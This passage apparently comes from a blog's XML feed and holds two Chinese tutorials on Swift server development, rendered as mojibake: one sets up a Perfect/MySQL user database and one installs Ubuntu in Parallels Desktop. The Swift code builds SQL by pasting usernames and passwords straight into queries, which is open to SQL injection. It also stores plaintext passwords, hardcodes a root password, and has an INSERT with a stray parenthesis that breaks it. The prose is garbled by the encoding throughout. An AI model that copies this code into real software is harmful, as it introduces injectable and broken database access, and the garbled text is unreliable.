MySQLæ•°æ®åº“çš„å®‰è£…ï¼Œè¯·å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œæœ¬æ–‡å¼€å¤´æœ‰è·³è½¬è¿žæŽ¥ã€‚ åˆ›å»ºæ•°æ®åº“å’Œè¡¨ åˆ›å»ºå¹¶é…ç½®MySQLæ•°æ®åº“ï¼Œæœ¬æ–‡ä»¥Navicat Premiumä¸ºä¾‹å­ã€‚ æ‰“å¼€Navicat Premiumè½¯ä»¶ï¼Œç‚¹å‡»å·¦ä¸Šè§’çš„è¿žæŽ¥ï¼Œé€‰æ‹©MySQLï¼Œåœ¨å¼¹å‡ºçš„çª—å£ä¸­è¾“å…¥å¯¹åº”çš„ä¿¡æ¯ï¼šå¦‚æˆ‘çš„è¿žæŽ¥åç§°ä¸ºiNoteï¼Œå…¶ä»–é€‰é¡¹å¦‚Hostã€Portã€User Nameä¿æŒé»˜è®¤ï¼Œå¯†ç å³ä¸ºä½ çš„å®‰è£…çš„MySQLå¯†ç ã€‚ é…ç½®å®ŒæœåŠ¡å™¨ä¿¡æ¯ï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œä¾‹å¦‚æˆ‘åˆ›å»ºä¸€ä¸ªåå­—ä¸ºiNoteDBçš„æ•°æ®åº“ã€‚ åœ¨iNoteDBæ•°æ®åº“ä¸­ç®€å•çš„æ–°å»ºäº†ä¸¤å¼ è¡¨ï¼Œä¸€å¼ æ˜¯ç”¨æˆ·è¡¨T_Usersï¼Œ ä¸€å¼ æ˜¯ç¬”è®°è¡¨T_Noteã€‚è¡¨ç»“æž„å¦‚ä¸‹ï¼š æˆ‘çš„å­—ç¬¦é›†é€‰utf-8ï¼ŒæŽ’åºè§„åˆ™utf8_general_ciã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨åœ¨è¡¨ä¸­æ’å…¥æ•°æ®ï¼Œå¦‚æˆ‘ä»¬åœ¨ç”¨æˆ·è¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œç”¨æˆ·åè¥¿é—¨æŠ½è¡€ï¼Œå¯†ç 1234567ã€‚ æ•°æ®åº“ç®¡ç†å·¥å…· åˆ›å»ºDataBaseManageræ–‡ä»¶ï¼Œç”¨æˆ·ç®¡ç†æ•°æ®åº“çš„è¿žæŽ¥ã€å…³é—­åŠæ•°æ®CRUDæ“ä½œã€‚ æ•°æ®åº“çš„è¿žæŽ¥é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 1234567//MARK: æ•°æ®åº“ä¿¡æ¯struct MySQLConnector &#123; static let host = "127.0.0.1" static let account = "root" static let password = "1234567" // ä¹‹å‰å®‰è£…çš„MySQLæœåŠ¡å™¨çš„å¯†ç  static let database = "iNoteDB" // åˆšåˆšåˆ›å»ºçš„æ•°æ®åº“åç§°&#125; åˆ›å»ºæ•°æ®åº“ç®¡ç†è€… 123456789101112131415class DataBaseManager &#123; /// å•ä¾‹ å…¨å±€æ•°æ®åº“å·¥å…·è®¿é—®ç‚¹ static let shared = DataBaseManager() private var mysql: MySQL private init() &#123; mysql = MySQL.init() // åˆ›å»ºMySQLå¯¹è±¡ let connected = mysql.connect(host: MySQLConnector.host, user: MySQLConnector.account, password: MySQLConnector.password, db: MySQLConnector.database) guard connected else &#123; print("MySQLè¿žæŽ¥å¤±è´¥" + mysql.errorMessage()) return &#125; &#125;&#125; æ“ä½œæ•°æ®åº“è¿›è¡Œå¸¸è§„çš„CURD isExistæ–¹æ³• ç”¨äºŽæŸ¥è¯¢ç‰¹å®šçš„ç”¨æˆ·æ˜¯å¦å­˜åœ¨ storeæ–¹æ³• ç”¨äºŽç¼“å­˜ä¸€æ¡ç”¨æˆ·è®°å½•åˆ°æœ¬åœ° usersæ–¹æ³• ç”¨äºŽæŸ¥è¯¢ç‰¹å®šçš„ä¸€æ¡ç”¨æˆ·æ•°æ®è®°å½• Perfectå¯¹MySQLçš„æ”¯æŒè¿˜ä¸æ˜¯å¾ˆå®Œå–„ï¼Œå†™å‡ºæ¥çš„ä»£ç æ¯”è¾ƒä¸‘é™‹ï¼Œå¯ä»¥å°è¯•ä¸‹ä½¿ç”¨å…¶ä»–çš„æ•°æ®æˆ–è€…é…å¥—çš„å¯¹è±¡ç®¡ç†å‡½æ•°åº“ï¼ˆORMï¼‰ï¼Œæ€»çš„æ¥è¯´æ”¯æŒçš„æœåŠ¡å™¨ç§ç±»è¿˜æ˜¯æ¯”è¾ƒå®Œå–„çš„ï¼Œæ€»èƒ½æ‰¾åˆ°ä½ ä¸­æ„çš„ä¸€æ¬¾ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576//MARK: Userextension DataBaseManager &#123; func isExist(of userName: String, in tableName: String) -&gt; Bool &#123; let sql = "SELECT * FROM \(tableName) WHERE userName = '\(userName)'" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return false &#125; // åœ¨å½“å‰ä¼šè¯è¿‡ç¨‹ä¸­ä¿å­˜æŸ¥è¯¢ç»“æžœ let resultSets = mysql.storeResults() var resultArray = [[String: String]]() resultSets?.forEachRow(callback: &#123; (row) in let userID = row[0] let userName = row[1] let password = row[2] let created = row[3] let updated = row[4] var dict = [String: String]() dict["userID"] = userID dict["userName"] = userName dict["password"] = password dict["created"] = created dict["updated"] = updated resultArray.append(dict) &#125;) guard let numRows = mysql.storeResults()?.numRows(), numRows &lt;= 0 else &#123; return false &#125; return true &#125; func store(user: User, to tableName: String) -&gt; Bool &#123; guard let userName = user.userName, let pwd = user.password else &#123; return false &#125; let values = "('\(userName)', '\(pwd)')" let sql = "INSERT INTO \(tableName) (userName, password) VALUES \(values))" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return false &#125; return true &#125; func users(of userName: String, in tableName: String) -&gt; [[String: Any]]? &#123; let sql = "SELECT * FROM \(tableName) WHERE userName = '\(userName)'" if !mysql.query(statement: sql) &#123; LogFile.error("Error query : \(sql)") return nil &#125; // åœ¨å½“å‰ä¼šè¯è¿‡ç¨‹ä¸­ä¿å­˜æŸ¥è¯¢ç»“æžœ let resultSets = mysql.storeResults() var resultArray = [[String: String]]() resultSets?.forEachRow(callback: &#123; (row) in let userID = row[0] let userName = row[1] let password = row[2] let created = row[3] let updated = row[4] var dict = [String: String]() dict["userID"] = userID dict["userName"] = userName dict["password"] = password dict["created"] = created dict["updated"] = updated resultArray.append(dict) &#125;) return resultArray &#125;&#125; å¯åŠ¨åŠæµ‹è¯•æœåŠ¡å™¨ åœ¨ç¨‹åºå…¥å£Main.swiftæ–‡ä»¶é…ç½®å¯åŠ¨æœåŠ¡å™¨ï¼Œå› ä¸ºä¸Šé¢æˆ‘ä»¬å·²ç»åœ¨æœåŠ¡å™¨ç®¡ç†è€…è¿™ä¸ªæ–‡ä»¶ä¸­å°è£…å¥½äº†å¯åŠ¨æ–¹æ³•ï¼Œæ­¤æ—¶å°±å¯ä»¥ä¸€è¡Œæžå®šï¼š 12// å¯åŠ¨æœåŠ¡å™¨NetworkServerManager.shared.serverStart() è¿è¡Œé¡¹ç›®ï¼Œç­‰å¾…æŽ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹ä¿¡æ¯ä»£è¡¨å¯åŠ¨æœåŠ¡å™¨æˆåŠŸï¼Œç„¶åŽæµ‹è¯•æ³¨å†ŒæœåŠ¡å™¨æŽ¥å£äº†ï¼Œä»¥postè¯·æ±‚çš„æ³¨å†ŒæŽ¥å£ä¸ºä¾‹å­ï¼š æˆ‘ä»¬è¿™é‡Œä½¿ç”¨Pawå·¥å…·æµ‹è¯•ç½‘ç»œæŽ¥å£ï¼Œå½“ç„¶ä½ ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨Post Manæµ‹è¯•ï¼Œç”šè‡³ä½ æƒ³çš„è¯å¯ä»¥è‡ªå·±å†™ç½‘ç»œæŽ¥å£è°ƒç”¨æµ‹è¯•ã€‚ å¦‚æžœæ˜¯getè¯·æ±‚ï¼Œä½ å¯ä»¥ç›´æŽ¥åœ¨æµè§ˆå™¨å°±å¯ä»¥æµ‹è¯•ï¼Œå¦‚æžœä½ æƒ³æ”¹ä¸‹æœ¬ä¾‹å­çš„è¯·æ±‚æ–¹å¼ï¼Œåªéœ€è¦åœ¨è·¯ç”±é…ç½®æ–¹æ³•ä¸­æŠŠ.getæ”¹ä¸º.postå³å¯ã€‚ 1[INFO] Starting HTTP server on 0.0.0.0:8181 ä¾‹å¦‚æˆ‘ä»¬æµ‹è¯•ï¼Œç”¨æˆ·åè¥¿é—¨æŠ½è¡€ï¼Œå¯†ç 1234567è¿›è¡Œæ³¨å†Œï¼Œå› ä¸ºä¹‹å‰æˆ‘ä»¬åœ¨æ•°æ®åº“ä¸­æ‰‹åŠ¨æ·»åŠ äº†ä¸€æ¡ç›¸åŒè®°å½•ï¼Œæ‰€ä»¥æ³¨å†Œç»“æžœå¦‚ä¸‹å›¾ï¼šæŽ¥å£è°ƒç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨è¿”å›žæ³¨å†Œå¤±è´¥ä¿¡æ¯ã€‚ ç»“å°¾ æœ¬æ–‡åªæ˜¯å¯¹ä½¿ç”¨Perfectæ­å»ºæœåŠ¡å™¨çš„ä¸€ä¸ªæ¦‚è¦æ€§æ€»ç»“ï¼Œå¸Œæœ›å¤§å®¶é€šè¿‡æœ¬æ–‡å¯ä»¥å¯¹Swiftå¼€å‘æœåŠ¡å™¨æ•´ä¸ªæµç¨‹æœ‰ä¸€ä¸ªè®¤è¯†ï¼Œå…·ä½“çš„ç»†èŠ‚å’Œæ³¨æ„ç‚¹éƒ½å¾…å®Œå–„ã€‚ è‡³äºŽé¡¹ç›®Demoï¼Œè‚¯å®šæ˜¯æœ‰çš„ï¼Œä½†æ˜¯ç›®å‰æ˜¯ä¸å¯èƒ½ç»™åˆ°å¤§å®¶äº†ï¼Œå› ä¸ºæˆ‘è¿˜æ²¡æœ‰å†™å®Œå•Šï¼Œç›®å‰åªæ˜¯å†™äº†ä¸€ä¸ªç²—ç•¥çš„æ³¨å†ŒæŽ¥å£ï¼Œå¹¶ä¸”é€»è¾‘è¿˜æ²¡å†™å®ŒðŸ˜‚ã€‚ å…¶å®žé¡¹ç›®çš„å®Œå–„éƒ¨åˆ†å°±é›†ä¸­åœ¨æŽ¥å£å“åº”å¤„ç†çš„å¯¹æœåŠ¡å™¨CRUDéƒ¨åˆ†äº†ï¼Œå› ä¸ºä½¿ç”¨MysqlæœåŠ¡å™¨ç”¨çš„å¾ˆä¸é¡ºæ‰‹ï¼Œå¯èƒ½ä¼šæ¢ç”¨å…¶ä»–æ¯”è¾ƒå®Œå–„çš„æ•°æ®åº“å†å®Œå–„è¿™ä¸€éƒ¨åˆ†ã€‚ ç­‰æœåŠ¡ç«¯å†™å®Œï¼Œåœ¨å¼€å‘å¯¹åº”çš„å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å°±ä¸ç”¨è¯´äº†ï¼Œå¤§å®¶ä¼°è®¡éƒ½å¿«å†™åäº†ðŸ˜‚ã€‚è‡³äºŽä»€ä¹ˆæ—¶å€™èƒ½å†™å®Œï¼Œæˆ‘è‡ªå·±éƒ½ä¸çŸ¥é“ï¼Œæ¯•ç«Ÿæˆ‘è¿™ä¹ˆæ‡’ðŸŒšðŸŒï¼ å‚è€ƒå®˜æ–¹æ–‡æ¡£Perfectå®˜æ–¹æ–‡æ¡£åœ¨è¿™é‡ŒSwiftå®˜æ–¹æ–‡æ¡£SwiftåŒ…ç®¡ç†å™¨.æœåŠ¡ç«¯æŒ‡å— | è‰¯å¥½çš„ API è®¾è®¡æŒ‡å—æœåŠ¡ç«¯å†™Swiftä½“éªŒ (Perfectæ¡†æž¶)Swift3.0æœåŠ¡ç«¯å¼€å‘(ä¸€) å®Œæ•´ç¤ºä¾‹æ¦‚è¿°åŠPerfectçŽ¯å¢ƒæ­å»ºä¸Žé…ç½®ï¼ˆæœåŠ¡ç«¯+iOSç«¯ï¼‰]]></content>
      <categories>
        <category>æœåŠ¡å™¨</category>
      </categories>
      <tags>
        <tag>æœåŠ¡å™¨</tag>
        <tag>Swift</tag>
        <tag>Perfect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Swiftå¼€å‘æœåŠ¡ç«¯ï¼ˆäºŒï¼‰ï¼šä½¿ç”¨Parallels Desktopè™šæ‹Ÿæœºå®‰è£…Ubuntuç³»ç»ŸåŠç›¸å…³é…ç½®]]></title>
    <url>%2Farchives%2F64bb63f1.html</url>
    <content type="text"><![CDATA[æ•…ä¹¡æ˜¯ä¸€ä¸ªäººçš„ç¾žæ¶©å¤„ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªäººæœ€å¤§çš„éšç§˜ã€‚æˆ‘æŠŠæ•…ä¹¡éšè—åœ¨èº«åŽï¼Œå•æžªåŒ¹é©¬åŽ»é—¯è¡ç”Ÿæ´»ã€‚æˆ‘åœ¨ä¸–ç•Œçš„ä»»ä½•ä¸€ä¸ªåœ°æ–¹èµ°åŠ¨ï¼Œå±…ä½å’Œç”Ÿæ´»ï¼Œé‚£ä¸æ˜¯æˆ‘çš„ï¼Œæˆ‘ä¸ä¼šç•™ä¸‹è„šå°ã€‚ â€”â€”åˆ˜äº®ç¨‹ã€Šä¸€ä¸ªäººçš„æ‘åº„ã€‹ ç®€ä»‹ Swiftå¯¹Macçš„åŽŸç”Ÿæ”¯æŒå°±ä¸ç”¨å¤šè¯´äº†ï¼Œè™½ç„¶æ˜¯å¼€æºç¼–ç¨‹è¯­è¨€ï¼Œä½†æ˜¯æœ‰å¥¹äº²çˆ¹è‹¹æžœåœ¨åŽé¢æ”¯æŒï¼Œèƒ½ä¸åŽŸç”Ÿæ”¯æŒè‹¹æžœç³»ç»ŸðŸŒï¼Ÿ å¥½æ¶ˆæ¯æ˜¯Swiftå¼€æºåŽæ”¯æŒLinuxï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Linuxä¸Šé¢ä½¿ç”¨Swifté…ç½®çŽ¯å¢ƒï¼Œç¼–å†™ã€ç¼–è¯‘ã€éƒ¨ç½²æœåŠ¡å™¨äº†ã€‚ æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•é€šè¿‡ä½¿ç”¨Parallels Desktopè™šæ‹Ÿæœºï¼ˆä»¥ä¸‹ç®€ç§°PDï¼‰ï¼Œåœ¨Macç³»ç»Ÿä¸‹å®‰è£…Ubuntuç³»ç»Ÿçº§æ³¨æ„ç‚¹ã€‚ å½“ç„¶ã€ä½ ä¹Ÿå¯ä»¥ç›´æŽ¥å®‰è£…ä¸€ä¸ªLinuxç³»ç»Ÿï¼Œæˆ–è€…åœ¨å…¶ä»–ç”µè„‘å®‰è£…Linuxç³»ç»Ÿï¼Œå…¨å‡­ä¸ªäººçˆ±å¥½ã€‚ Swiftå¼€å‘æœåŠ¡ç«¯ï¼ˆä¸€ï¼‰ï¼šMySQLå®‰è£…åŠé…ç½® æ­£æ–‡ PDæ˜¯ä¸€æ¬¾ç›¸å½“å¼ºå¤§ä¸”å¥½ç”¨çš„è™šæ‹Ÿæœºï¼Œå¯ä»¥å®‰è£…Androidã€Macã€windowsã€ä»¥åŠæ¯”è¾ƒå¸¸ç”¨çš„Linuxç³»ç»Ÿï¼ˆè‡³äºŽå¦‚ä½•èŽ·å–è¯¥è½¯ä»¶ï¼Œè‡ªå·±çœ‹ç€åŠžðŸ˜‚ï¼‰ã€‚ PDå·²ç»é›†æˆäº†ä¸Šé¢ç³»ç»Ÿçš„ä¸‹è½½å®‰è£…åŠŸèƒ½ã€‚å¦‚æžœä½ çš„ç½‘é€Ÿæ¯”è¾ƒå¿«ã€è€Œä¸”ç£ç›˜ç©ºé—´ä¹Ÿæ¯”è¾ƒå……è£•çš„æƒ…å†µä¸‹ï¼Œå¼ºçƒˆæŽ¨èä½¿ç”¨è¿™ç§æ–¹å¼å®‰è£…ï¼Œå®Œå…¨é€‚åˆåƒæˆ‘è¿™ç§æ¯”è¾ƒæ‡’çš„äººã€‚ å½“ç„¶äº†ï¼Œæˆ‘æ˜¯é€šè¿‡å•ç‹¬ä¸‹è½½å®‰è£…åŒ…çš„æ–¹å¼å®‰è£…çš„ï¼Œä½ é—®æˆ‘ä¸ºä»€ä¹ˆï¼Ÿå½“ç„¶æ˜¯å› ä¸ºè¿™æ ·æ˜¾å¾—é€¼æ ¼æ¯”è¾ƒé«˜å•ŠðŸŒšã€‚ å¥½å§ï¼Œè‚¯å®šå¾ˆå¤šå°ä¼™ä¼´ä¸ç›¸ä¿¡ï¼Œå…¶å®žæˆ‘è‡ªå·±éƒ½ä¸ç›¸ä¿¡emmmï¼Œä¸»è¦æ˜¯å› ä¸ºæˆ‘ä½¿ç”¨å…¬å¸çš„iMacã€ç³»ç»Ÿç›˜æ˜¯åŽæ¥åŠ çš„SSDï¼Œå®¹é‡æ²¡æœ‰å¤šå°‘äº†ï¼Œæ‰€ä»¥åªèƒ½æ‰‹åŠ¨å®‰è£…åˆ°åŽŸæ¥çš„1Tæœºæ¢°ç¡¬ç›˜é‡Œé¢äº†ã€‚ å®‰è£…è‡ªåŠ¨ä¸‹è½½å®‰è£… æ‰“å¼€PD,é€‰æ‹©éœ€è¦å®‰è£…çš„Linuxï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ï¼š ç‚¹å‡»ä¸‹è½½æŒ‰é’®å¼€å§‹ä¸‹è½½å®‰è£…ï¼Œæ²¡ä»€ä¹ˆéœ€è¦è¯´çš„ï¼š æ‰‹åŠ¨å®‰è£…ä¸‹è½½Ubuntuå®‰è£…åŒ… åœ¨Ubuntu downloadsä¸‹è½½å®‰è£…åŒ…ã€‚ æœ‰æ¡Œé¢ç‰ˆå’ŒæœåŠ¡å™¨ç‰ˆæœ¬ï¼Œæ¡Œé¢ç‰ˆä¼šæ¯”æœåŠ¡å™¨ç‰ˆå®‰è£…åŒ…å¤§ä¸€äº›ï¼Œå¤šäº†ä¸€äº›ç•Œé¢å…ƒç´ ã€‚æœåŠ¡å™¨ç‰ˆåå‘äºŽå‘½ä»¤è¡Œæ“ä½œï¼Œå¦‚ä½•é€‰æ‹©çœ‹ä¸ªäººçˆ±å¥½ã€‚ æˆ‘æ˜¯æƒ³é¡ºä¾¿ä½“éªŒä¸‹Ubuntuç³»ç»Ÿï¼Œæ‰€ä»¥å®‰è£…çš„æ˜¯16.04çš„æ¡Œé¢ç‰ˆã€‚ å®‰è£… æ‰“å¼€PD,é€‰æ‹©é€šè¿‡é•œåƒæ–‡ä»¶å®‰è£…ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ï¼š å¯ä»¥æ‰‹åŠ¨é€‰æ‹©æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå¯ä»¥å°†ä¸‹è½½çš„å®‰è£…åŒ…æ‹–æ‹½åˆ°å½“å‰çš„PDçª—å£æ”¾æ‰‹å°±å¯ä»¥ï¼š å®ŒæˆåŽé€‰æ‹©éœ€è¦å®‰è£…çš„é•œåƒæ–‡ä»¶ï¼Œç»§ç»­ä¸‹ä¸€æ­¥ï¼Œè¾“å…¥è´¦å·å¯†ç ï¼š é€‰æ‹©å®‰è£…åç§°ä»¥åŠå®‰è£…ç›®å½•ï¼š ä¹‹åŽè·Ÿç€æç¤ºä¸€è·¯ç¡®å®šå°±å¯ä»¥å®‰è£…æˆåŠŸï¼Œè¿›å…¥ç™»å½•ç•Œé¢ï¼Œè¾“å…¥å¯†ç è¿›å…¥ç³»ç»Ÿï¼ˆæˆ‘è¿™é‡Œæ˜¾ç¤ºæ•ˆæžœå·²ç»ä¼˜åŒ–è¿‡ï¼Œä½ å®‰è£…å®Œå¯èƒ½å’Œæˆ‘çš„æœ‰ä¸€äº›ç»†å¾®çš„å·®åˆ«ï¼Œå…·ä½“è®¾ç½®åœ¨ä¸‹é¢ï¼‰ï¼š è™šæ‹Ÿæœºè®¾ç½® å¦‚æžœæœ‰éœ€è¦å¯¹è™šæ‹Ÿæœºé‡æ–°é…ç½®ä¸€äº›å‚æ•°ã€å¦‚ç£ç›˜å¤§å°ã€å†…å­˜å¤§å°ã€é”®ç›˜ã€ç½‘ç»œç­‰ç­‰ã€éƒ½å¯ä»¥é€šè¿‡è™šæ‹Ÿæœºçª—å£å³ä¸Šè§’çš„è®¾ç½®é€‰é¡¹é‡æ–°é…ç½®ã€‚ ä¹Ÿå¯ä»¥åœ¨è™šæ‹Ÿæœºèœå•é‡Œé¢æ‰¾åˆ°è¯¥è®¾ç½®é€‰é¡¹ã€‚ æ‰€æœ‰ä¿®æ”¹éƒ½éœ€è¦é‡æ–°å¯åŠ¨è™šæ‹Ÿæœºæ‰å¯ä»¥ç”Ÿæ•ˆã€‚ ä¼˜åŒ–é…ç½®Ubuntuå…¨å±è®¾ç½® é»˜è®¤å®‰è£…å®ŒæˆåŽï¼ŒUbuntuçª—å£æ˜¯æ— æ³•é€‚é…å…¨å±çš„ï¼Œçœ‹ç€å¾ˆéš¾å—ã€‚éœ€è¦æ‰‹åŠ¨å®‰è£…Parallels Toolsã€‚ ç‚¹å‡»PDè™šæ‹Ÿæœºçš„çª—å£å³ä¸Šè§’çš„é»„è‰²æ„Ÿå¹å·ï¼ˆç¬¬ä¸€æ¬¡å®‰è£…ä¼šæœ‰ï¼‰ï¼Œæˆ–è€…ä»Žèœå•é€‰æ‹©Install Parallels Toolsï¼Œç„¶åŽæ ¹æ®æç¤ºä¸€æ­¥æ­¥æ“ä½œå³å¯ã€‚ å¦‚æžœå®‰è£…ä¸æˆåŠŸï¼Œå¯ä»¥æ‰‹åŠ¨å®‰è£… æ‰“å¼€Ubuntuçš„ Terminal ï¼ˆå¿«æ·é”®ï¼šCtrl + Option + Tï¼‰. åˆ‡æ¢åˆ°ç³»ç»Ÿç®¡ç†å‘˜æƒé™: 1sudo su // or su ç¡®ä¿è™šæ‹Ÿæœºçš„DVDé©±åŠ¨å·²ç»é€€å‡º 1eject /dev/cdrom é€‰æ‹©PDèœå• &gt; Devices &gt; CD/DVD &gt; Connect imageï¼Œé€‰æ‹© /Applications/Parallels Desktop/Contents/Resources/Toolsç›®å½•ä¸‹çš„prl-tools-lin.isoæ–‡ä»¶. æŒ‚è½½Parallels Toolsé•œåƒåˆ°Linuxè™šæ‹Ÿæœº: 12mkdir /media/cdrommount /dev/cdrom /media/cdrom æ£€æŸ¥é•œåƒæ˜¯å¦è¢«æˆåŠŸæŒ‚è½½ 1234ls /media/cdrom// è¾“å‡ºä¿¡æ¯install* installer/ install-gui* kmods/ tools/ version è¿›å…¥åˆ°é•œåƒæ–‡ä»¶ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå®‰è£…åŒ…ï¼š 12cd /media/cdrom./install Ubuntuåˆ†è¾¨çŽ‡ å®‰è£…å®ŒæˆParallels ToolsåŽï¼Œç³»ç»Ÿçš„åˆ†è¾¨çŽ‡é»˜è®¤æ˜¯Macç³»ç»Ÿçš„æœ€é«˜åˆ†è¾¨çŽ‡ï¼Œæˆ‘çš„iMacåˆ†è¾¨çŽ‡æ˜¯4Kï¼Œå¯¼è‡´æ˜¾ç¤ºå†…å®¹è¢«ç¼©æ”¾çš„ç‰¹åˆ«å°ï¼Œéžå¸¸éš¾å—ã€‚ æ›´éš¾å—çš„æ˜¯é»˜è®¤æ— æ³•æ›´æ”¹åˆ†è¾¨çŽ‡ï¼Œæœ¬ç€æœ‰æ¡ä»¶è¦ä¸Šï¼Œæ²¡æ¡ä»¶åˆ›é€ æ¡ä»¶ä¹Ÿè¦ä¸Šçš„åŽŸåˆ™ï¼Œæ‰¾åˆ°äº†ä¿®æ”¹åˆ†è¾¨çŽ‡çš„æ–¹æ³•ï¼š æ‰“å¼€ç»ˆç«¯è¾“å…¥xrandræŸ¥çœ‹ç³»ç»Ÿæ”¯æŒçš„åˆ†è¾¨çŽ‡ï¼Œ*æ ‡è¯†æ­£åœ¨ä½¿ç”¨çš„åˆ†è¾¨çŽ‡ï¼š æ‰“å¼€ç³»ç»Ÿè¯Šæ–­æ¡†ï¼Œå°†å¯ä»¥é€‰æ‹©å‹¾é€‰ä¸€äº›è°ƒè¯•é€‰é¡¹ï¼Œä¹Ÿå¯ä»¥ä»€ä¹ˆä¹Ÿä¸åšï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1sudo xdiagnose ç‚¹å‡»åº”ç”¨ï¼Œå…³é—­è¯Šæ–­çª—å£ ä¿®æ”¹å®ŒæˆåŽéœ€è¦é‡æ–°å¯åŠ¨è™šæ‹Ÿæœºï¼Œå¯ä»¥åœ¨è™šæ‹Ÿæœºèœå•æ ç‚¹å‡»é‡å¯é€‰é¡¹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š 1sudo reboot æ‰“å¼€Ubuntuç³»ç»Ÿçš„è®¾ç½®èœå•ï¼Œè¿›å…¥æ˜¾ç¤ºè®¾ç½®ï¼Œæ­¤æ—¶é‡Œé¢å·²ç»å¯ä»¥è®¾ç½®ä¸åŒçš„åˆ†è¾¨çŽ‡äº†ã€‚ä½†æ˜¯æˆ‘å‘çŽ°å¯ä»¥ç›´æŽ¥ä½¿ç”¨æœ€é«˜çš„åˆ†è¾¨çŽ‡ï¼Œåªéœ€è¦ä¿®æ”¹èœå•å’Œæ ‡é¢˜ç¼©æ”¾æ¯”ä¾‹å°±å¯ä»¥ä½¿æ•´ä¸ªç•Œé¢å¾ˆå¹²å‡€é€šé€çš„æ˜¾ç¤ºæ•ˆæžœäº†ã€‚ ç³»ç»Ÿæ–‡ä»¶ä¿®å¤ ç”±äºŽMacç³»ç»Ÿï¼ˆçªç„¶æ–­ç”µæˆ–æ­»æœºæˆ–æœªæ­£å¸¸å…³é—­ï¼‰å…³é—­æˆ–è€…è™šæ‹Ÿæœºéžæ­£å¸¸å…³é—­éƒ½å¯èƒ½ä¼šå¯¼è‡´ç£ç›˜æ£€æµ‹ä¸èƒ½é€šè¿‡ï¼Œæ— æ³•æ­£å¸¸è¿›å…¥Ubuntuç³»ç»Ÿï¼š 123456789101112dev/sda1: Inodes that were part of a corrupted orphan linked list found./dev/sda1: UNEXPECTED INCONSISTENCY:; RUN fsck MANUALLY (i.e., without -a or -p options)fsck exited with status code 4The root filesystem on /dev/sda1 requires a manual fsckmodprobe: module ehci-orion not found in modules.depBusyBox v1.22.1 (Debian 1:1.22.0-9+deb8u1) built-in shell (ash)Enter 'help' for a list of built-in commands./bin/sh: can't access tty; job control turned off(initramfs) _ è§£å†³æ–¹æ³•ï¼šè¾“å…¥ä¸‹é¢æŒ‡ä»¤åŽï¼ŒæŒ‰ç…§æç¤ºä¸€è·¯å›žè½¦ï¼ˆyesï¼‰æ“ä½œåŽï¼Œä¼šè‡ªåŠ¨é‡å¯å³å¯è§£å†³ 1(initramfs) fsck -c /dev/sda1 // ä¿®å¤å¯¹è±¡å–å†³äºŽå‡ºé”™çš„å¯¹è±¡ï¼Œå¯ä»¥æ˜¯ä¸€å—ç£ç›˜æˆ–è€…ä¸€ä¸ªVG rootæƒé™ sudo + å‘½ä»¤ï¼Œè¾“å…¥å½“å‰ç”¨æˆ·å¯†ç åŽä»¥rootæƒé™æ‰§è¡Œå‘½ä»¤ï¼Œæœ‰æ—¶é—´é™åˆ¶ä¸”ä»…é™å½“å‰å‘½ä»¤ã€‚ sudo -iï¼Œè¾“å…¥å½“å‰ç”¨æˆ·å¯†ç åŽä»¥rootæƒé™ç™»å½•shellï¼Œæ— æ—¶é—´é™åˆ¶ã€‚ä½¿ç”¨exitæˆ–logouté€€å‡ºã€‚ suï¼Œè¾“å…¥rootè´¦æˆ·çš„å¯†ç åŽåˆ‡æ¢åˆ°rootèº«ä»½ï¼Œæ— æ—¶é—´é™åˆ¶ã€‚suç”¨æˆ·ååˆ‡æ¢å›žå…¶å®ƒç”¨æˆ·ã€‚ sudo suï¼Œæ•ˆæžœåŒsuï¼Œåªæ˜¯ä¸éœ€è¦rootçš„å¯†ç ï¼Œè€Œéœ€è¦å½“å‰ç”¨æˆ·çš„å¯†ç ã€‚ è®¾ç½®rootå¯†ç  Ubuntuçš„é»˜è®¤rootå¯†ç æ˜¯éšæœºçš„ï¼Œå³æ¯æ¬¡å¼€æœºéƒ½æœ‰ä¸€ä¸ªæ–°çš„rootå¯†ç ã€‚ å¦‚æžœéœ€è¦è®¾ç½®rootç”¨æˆ·å¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š ä¼šéœ€è¦è¾“å…¥é»˜è®¤ç”¨æˆ·å¯†ç  è®¾ç½®rootç”¨æˆ·å¯†ç  ç¡®è®¤rootç”¨æˆ·å¯†ç  1sudo passwd root ä¿®æ”¹æˆåŠŸåŽï¼Œéœ€è¦rootæƒé™ï¼Œæ‰§è¡Œsu rootå‘½ä»¤ï¼Œè¾“å…¥rootå¯†ç å°±å¯ä»¥äº†ã€‚ å…¶ä»–é—®é¢˜VIMæ–¹å‘é”®åŠåˆ é™¤é”® ç³»ç»Ÿé»˜è®¤è‡ªå¸¦çš„vimæ–¹å‘é”®ä¸èƒ½å’ŒMacä¸‹ä¸€æ ·è‡ªå¦‚çš„åˆ‡æ¢å…‰æ ‡ä½ç½®ï¼Œä¼šå˜æˆABCDï¼Œè€Œä¸”åˆ é™¤é”®ä¹Ÿå¤±æ•ˆã€‚ è§£å†³æ–¹æ³•ï¼š 